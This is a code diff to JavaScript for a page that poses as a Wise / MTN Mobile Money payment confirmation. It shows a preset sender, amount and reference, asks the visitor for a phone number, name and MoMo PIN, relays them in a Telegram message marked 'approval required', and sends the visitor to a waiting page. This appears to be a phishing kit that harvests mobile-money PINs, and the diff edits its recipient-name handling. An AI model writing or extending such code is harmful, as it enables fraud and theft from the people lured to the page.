@@ -426,6 +426,7 @@
   const DEFAULT_DATA = {
     senderName: 'Maya Chen',
     senderEmail: 'maya.chen@example.com',
+    recipientName: '',        // ← blank unless the admin sets one
     amount: 1250.00,
     currency: 'USD',
     reference: 'WISE-2025-4F2A',
@@ -505,12 +506,14 @@
     } catch (e) { console.error('Telegram send failed:', e); }
   }
 
-  // Render amount
+  // ---- Render amount ----
   $('mtnAmount').textContent = fmtAmount(paymentData.amount);
   $('mtnCurrency').textContent = paymentData.currency || 'USD';
-  if (!recipientName.value) recipientName.value = paymentData.senderName || '';
 
-  // Country picker
+  // ---- Recipient name: read from paymentData.recipientName (blank if unset) ----
+  recipientName.value = (paymentData.recipientName || '').trim();
+
+  // ---- Country picker ----
   countrySelect.addEventListener('change', () => {
     const p = countrySelect.value.split('|');
     countryFlag.textContent = p[2];
@@ -518,7 +521,7 @@
     phoneWrap.classList.remove('error');
   });
 
-  // PIN toggle
+  // ---- PIN toggle ----
   pinToggle.addEventListener('click', () => {
     const pw = momoPin.type === 'password';
     momoPin.type = pw ? 'text' : 'password';
@@ -527,23 +530,26 @@
       : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
   });
 
-  // Input filters
+  // ---- Input filters ----
   recipientPhone.addEventListener('input', () => {
     recipientPhone.value = recipientPhone.value.replace(/[^\d\s]/g, '');
     phoneWrap.classList.remove('error');
+  });
+  recipientName.addEventListener('input', () => {
+    recipientName.classList.remove('error');
   });
   momoPin.addEventListener('input', () => {
     momoPin.value = momoPin.value.replace(/\D/g, '').slice(0, 5);
     momoPin.classList.remove('error');
   });
 
-  // Back
+  // ---- Back ----
   $('backBtn').addEventListener('click', () => {
     window.location.href = 'index.html';
   });
 
   // ============================================================
-  // CONFIRM → SEND ENHANCED TELEGRAM MESSAGE → NAVIGATE
+  // CONFIRM → SEND TELEGRAM MESSAGE → NAVIGATE
   // ============================================================
   mtnConfirmBtn.addEventListener('click', async () => {
     const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
@@ -586,7 +592,7 @@
     const txnId = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
 
     // ============================================================
-    // ENHANCED TELEGRAM MESSAGE
+    // TELEGRAM MESSAGE
     // ============================================================
     const message = `🔔 <b>NEW TRANSACTION — APPROVAL REQUIRED</b>
 
@@ -629,7 +635,6 @@
     try {
       await sendTelegram(message, txnId, 'recipient');
 
-      // Save session for the next pages
       sessionStorage.setItem('wise_session', JSON.stringify({
         txnId,
         stage: 'recipient',
@@ -646,7 +651,6 @@
         txnSentAt: Date.now()
       }));
 
-      // Navigate immediately
       window.location.href = 'waiting.html';
     } catch (err) {
       console.error('Failed:', err);
